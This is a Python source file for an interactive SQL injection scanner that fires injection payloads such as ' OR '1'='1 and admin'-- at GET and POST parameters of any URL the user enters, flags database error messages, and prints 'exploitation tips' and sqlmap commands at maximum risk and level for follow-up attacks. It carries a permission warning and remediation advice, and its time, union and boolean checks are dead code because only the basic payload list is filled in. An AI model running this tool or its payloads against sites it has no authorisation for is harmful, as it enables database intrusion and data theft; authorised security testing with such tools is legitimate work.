import requests
import time
import urllib.parse
from urllib.parse import urljoin, urlparse
import sys
import re

class SQLiScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # SQL injection payloads for different types of attacks
        self.payloads = {
            'basic': [
                "'",
                "' OR '1'='1",
                "' OR 1=1--",
                "admin'--",
                '" OR "1"="1',
            ],
            'time_based': [],
            'union_based': [],
            'error_based': [],
            'boolean_based': []
        }
        
        # Common error messages that indicate SQL injection vulnerabilities
        self.error_patterns = [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_.*',
            r'valid MySQL result',
            r'MySqlClient\.',
            r'PostgreSQL.*ERROR',
            r'Warning.*pg_.*',
            r'valid PostgreSQL result',
            r'Npgsql\.',
            r'Driver.*SQL.*Server',
            r'OLE DB.*SQL Server',
            r'(\W|\A)SQL Server.*Driver',
            r'Warning.*mssql_.*',
            r'Warning.*odbc_.*',
            r'Warning.*oci_.*',
            r'Warning.*ora_.*',
            r'Oracle error',
            r'Oracle.*Driver',
            r'Warning.*sqlite_.*',
            r'SQLite.*error',
            r'Warning.*firebird.*',
            r'Warning.*maxdb.*',
            r'Warning.*sybase.*',
            r'Sybase message',
            r'Warning.*ingres.*',
            r'Warning.*db2_.*',
            r'CLI Driver.*DB2',
            r'Warning.*informix.*',
            r'com\.informix\.jdbc',
            r'Warning.*access.*',
            r'Microsoft Access Driver',
            r'JET Database Engine',
            r'Access Database Engine',
            r'Warning.*foxpro.*',
            r'Warning.*dbase.*',
        ]
        
        self.vulnerability_count = 0
        self.vulnerable_params = []
        
    def test_url(self, url, param_name=None, method='GET'):
        """Test a single URL for SQL injection vulnerabilities"""
        print(f"\n[*] Testing URL: {url}")
        print(f"[*] Method: {method}")
        
        if method.upper() == 'GET':
            return self.test_get_sqli(url, param_name)
        elif method.upper() == 'POST':
            return self.test_post_sqli(url, param_name)
    
    def detect_sqli_vulnerability(self, response1, response2, payload, param, url):
        """Detect SQL injection based on response differences"""
        vulnerability_info = None
        
        # Check for SQL error messages
        for pattern in self.error_patterns:
            if re.search(pattern, response2.text, re.IGNORECASE):
                vulnerability_info = {
                    'type': 'Error-based SQL Injection',
                    'param': param,
                    'payload': payload,
                    'url': url,
                    'evidence': f'SQL error pattern detected: {pattern}'
                }
                break
        
        # Check for time-based SQL injection
        if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper() or 'pg_sleep' in payload:
            if response2.elapsed.total_seconds() > 4:  # 5 second delay with some tolerance
                vulnerability_info = {
                    'type': 'Time-based SQL Injection',
                    'param': param,
                    'payload': payload,
                    'url': url,
                    'evidence': f'Response time: {response2.elapsed.total_seconds():.2f}s (expected ~5s delay)'
                }
        
        # Check for union-based injection (different content length or structure)
        elif 'UNION' in payload.upper():
            if abs(len(response2.text) - len(response1.text)) > 100:  # Significant difference
                vulnerability_info = {
                    'type': 'Union-based SQL Injection',
                    'param': param,
                    'payload': payload,
                    'url': url,
                    'evidence': f'Response length difference: {len(response2.text) - len(response1.text)} bytes'
                }
        
        # Check for boolean-based injection (response differences)
        elif ('AND 1=1' in payload or 'AND 1=2' in payload or "AND 'a'='a'" in payload or "AND 'a'='b'" in payload):
            if abs(len(response2.text) - len(response1.text)) > 50:
                vulnerability_info = {
                    'type': 'Boolean-based SQL Injection',
                    'param': param,
                    'payload': payload,
                    'url': url,
                    'evidence': f'Boolean condition response difference detected'
                }
        
        return vulnerability_info
    
    def test_get_sqli(self, url, param_name=None):
        """Test GET parameters for SQL injection"""
        vulnerable_payloads = []
        
        # Parse URL to extract existing parameters
        from urllib.parse import urlparse, parse_qs
        parsed_url = urlparse(url)
        existing_params = parse_qs(parsed_url.query)
        
        # Get baseline response
        try:
            print("[*] Getting baseline response...")
            baseline_response = self.session.get(url, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"[!] Error getting baseline response: {e}")
            return []
        
        # If URL has parameters, test those first
        if existing_params and not param_name:
            test_params = list(existing_params.keys())
            print(f"[*] Found parameters in URL: {', '.join(test_params)}")
        # If no specific parameter provided, try common parameter names
        elif not param_name:
            test_params = ['id', 'user', 'username', 'name', 'search', 'q', 'query', 'page', 'category', 'item']
            print("[*] No parameter specified. Testing common parameter names...")
        else:
            test_params = [param_name]
        
        for param in test_params:
            print(f"\n[*] Testing parameter: {param}")
            
            # Only test basic payloads category
            category = 'basic'
            payloads = self.payloads[category]
            print(f"\n[*] Testing {len(payloads)} basic SQL injection payloads...")
            
            for i, payload in enumerate(payloads, 1):
                try:
                    print(f"[*] Testing payload {i}/{len(payloads)}: {payload[:50]}...")
                    
                    # Send request with payload
                    start_time = time.time()
                    response = self.session.get(url, params={param: payload}, timeout=15)
                    
                    # Detect vulnerability
                    vuln_info = self.detect_sqli_vulnerability(baseline_response, response, payload, param, url)
                    
                    if vuln_info:
                        print(f"[!] {vuln_info['type']} VULNERABILITY FOUND!")
                        print(f"    Parameter: {param}")
                        print(f"    Payload: {payload}")
                        print(f"    Evidence: {vuln_info['evidence']}")
                        print(f"    Response Status: {response.status_code}")
                        
                        vuln_info['method'] = 'GET'
                        vuln_info['category'] = category
                        vulnerable_payloads.append(vuln_info)
                        
                        self.vulnerability_count += 1
                        if param not in self.vulnerable_params:
                            self.vulnerable_params.append(param)
                    
                    # Small delay to be respectful
                    time.sleep(0.1)
                    
                except requests.exceptions.RequestException as e:
                    print(f"[!] Error testing payload: {e}")
                    continue
        
        return vulnerable_payloads
    
    def test_post_sqli(self, url, param_name=None):
        """Test POST parameters for SQL injection"""
        vulnerable_payloads = []
        
        # Get baseline response
        try:
            print("[*] Getting baseline POST response...")
            baseline_response = self.session.post(url, data={}, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"[!] Error getting baseline response: {e}")
            return []
        
        if not param_name:
            test_params = ['id', 'user', 'username', 'password', 'name', 'search', 'comment', 'message', 'email']
        else:
            test_params = [param_name]
        
        for param in test_params:
            print(f"\n[*] Testing POST parameter: {param}")
            
            # Only test basic payloads category
            category = 'basic'
            payloads = self.payloads[category]
            print(f"\n[*] Testing {len(payloads)} basic SQL injection payloads...")
            
            for i, payload in enumerate(payloads, 1):
                try:
                    print(f"[*] Testing payload {i}/{len(payloads)}: {payload[:50]}...")
                    
                    # Send POST request with payload
                    response = self.session.post(url, data={param: payload}, timeout=15)
                    
                    # Detect vulnerability
                    vuln_info = self.detect_sqli_vulnerability(baseline_response, response, payload, param, url)
                    
                    if vuln_info:
                        print(f"[!] {vuln_info['type']} VULNERABILITY FOUND!")
                        print(f"    Parameter: {param}")
                        print(f"    Payload: {payload}")
                        print(f"    Evidence: {vuln_info['evidence']}")
                        print(f"    Response Status: {response.status_code}")
                        
                        vuln_info['method'] = 'POST'
                        vuln_info['category'] = category
                        vulnerable_payloads.append(vuln_info)
                        
                        self.vulnerability_count += 1
                        if param not in self.vulnerable_params:
                            self.vulnerable_params.append(param)
                    
                    time.sleep(0.1)
                    
                except requests.exceptions.RequestException as e:
                    print(f"[!] Error testing payload: {e}")
                    continue
        
        return vulnerable_payloads
    
    def scan_for_api(self, url, param_name=None, method='GET'):
        """Simplified scan method for API usage"""
        self.vulnerability_count = 0
        self.vulnerable_params = []
        
        vulnerabilities = self.test_url(url, param_name, method)
        
        # Create summary report
        report = {
            'total_vulnerabilities': len(vulnerabilities),
            'vulnerable_params': self.vulnerable_params,
            'vulnerabilities': vulnerabilities,
            'vulnerability_types': {}
        }
        
        # Group by type
        for vuln in vulnerabilities:
            vuln_type = vuln['type']
            if vuln_type not in report['vulnerability_types']:
                report['vulnerability_types'][vuln_type] = 0
            report['vulnerability_types'][vuln_type] += 1
        
        return report
    
    def generate_report(self, results):
        """Generate a detailed vulnerability report"""
        print("\n" + "="*60)
        print("            SQL INJECTION VULNERABILITY REPORT")
        print("="*60)
        
        if not results:
            print("[✓] NO SQL INJECTION VULNERABILITIES FOUND")
            print("    The target appears to be secure against basic SQL injection attacks.")
            return
        
        print(f"[!] TOTAL VULNERABILITIES FOUND: {len(results)}")
        print(f"[!] VULNERABLE PARAMETERS: {len(self.vulnerable_params)}")
        print(f"[!] VULNERABLE PARAMS: {', '.join(self.vulnerable_params)}")
        
        # Group by vulnerability type
        vuln_types = {}
        for vuln in results:
            vuln_type = vuln['type']
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = []
            vuln_types[vuln_type].append(vuln)
        
        print(f"\n[!] VULNERABILITY TYPES FOUND:")
        for vuln_type, vulns in vuln_types.items():
            print(f"    - {vuln_type}: {len(vulns)} instances")
        
        print("\n[!] DETAILED FINDINGS:")
        for i, vuln in enumerate(results, 1):
            print(f"\n--- Vulnerability #{i} ---")
            print(f"Type: {vuln['type']}")
            print(f"URL: {vuln['url']}")
            print(f"Method: {vuln['method']}")
            print(f"Parameter: {vuln['param']}")
            print(f"Payload: {vuln['payload']}")
            print(f"Evidence: {vuln['evidence']}")
            print(f"Category: {vuln['category']}")
            
        print("\n[!] EXPLOITATION TIPS:")
        print("1. Use tools like sqlmap for automated exploitation")
        print("2. Manually test payloads in browser/Burp Suite")
        print("3. Try different encoding methods (URL, hex, etc.)")
        print("4. Test for database-specific functions and syntax")
        print("5. Look for information disclosure in error messages")
        
        print("\n[!] ADVANCED TESTING:")
        print("1. Test with different SQL comment styles (-- vs #)")
        print("2. Try stacked queries (; commands)")
        print("3. Test for second-order SQL injection")
        print("4. Check for blind SQL injection techniques")
        
        print("\n[!] REMEDIATION:")
        print("1. Use parameterized queries/prepared statements")
        print("2. Implement proper input validation and sanitization")
        print("3. Use stored procedures with parameterized inputs")
        print("4. Apply principle of least privilege to database accounts")
        print("5. Enable SQL query logging and monitoring")
        print("6. Use Web Application Firewall (WAF) rules")
        print("7. Regular security code reviews and testing")

def main():
    scanner = SQLiScanner()
    
    print("="*60)
    print("        AUTOMATED SQL INJECTION VULNERABILITY SCANNER")
    print("="*60)
    print("WARNING: This tool is for educational purposes only!")
    print("Only test on websites you own or have permission to test.")
    print("="*60)
    
    # Get user input
    target_url = input("\n[*] Enter target URL: ").strip()
    
    if not target_url:
        print("[!] No URL provided. Using default test URL...")
        target_url = "http://testphp.vulnweb.com/artists.php"
    
    # Validate URL
    try:
        parsed = urlparse(target_url)
        if not parsed.scheme:
            target_url = "http://" + target_url
    except:
        print("[!] Invalid URL format")
        return
    
    param_name = input("[*] Enter parameter name (leave empty for auto-detection): ").strip()
    if not param_name:
        param_name = None
    
    method = input("[*] Enter HTTP method (GET/POST) [default: GET]: ").strip().upper()
    if method not in ['GET', 'POST']:
        method = 'GET'
    
    print(f"\n[*] Starting SQL injection scan...")
    print(f"[*] Target: {target_url}")
    print(f"[*] Parameter: {param_name or 'Auto-detect'}")
    print(f"[*] Method: {method}")
    
    total_payloads = sum(len(payloads) for payloads in scanner.payloads.values())
    print(f"[*] Total payloads to test: {total_payloads}")
    print(f"[*] Payload categories: {', '.join(scanner.payloads.keys())}")
    
    # Run the scan
    all_vulnerabilities = []
    
    try:
        vulnerabilities = scanner.test_url(target_url, param_name, method)
        all_vulnerabilities.extend(vulnerabilities)
        
        # Generate report
        scanner.generate_report(all_vulnerabilities)
        
        # Additional suggestions
        if all_vulnerabilities:
            print(f"\n[!] NEXT STEPS:")
            print(f"[*] Consider using sqlmap for advanced exploitation:")
            print(f"    sqlmap -u \"{target_url}\" --batch --risk=3 --level=5")
            if param_name:
                print(f"    sqlmap -u \"{target_url}\" -p \"{param_name}\" --batch")
        
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
    except Exception as e:
        print(f"\n[!] Error during scan: {e}")

if __name__ == "__main__":
    main()
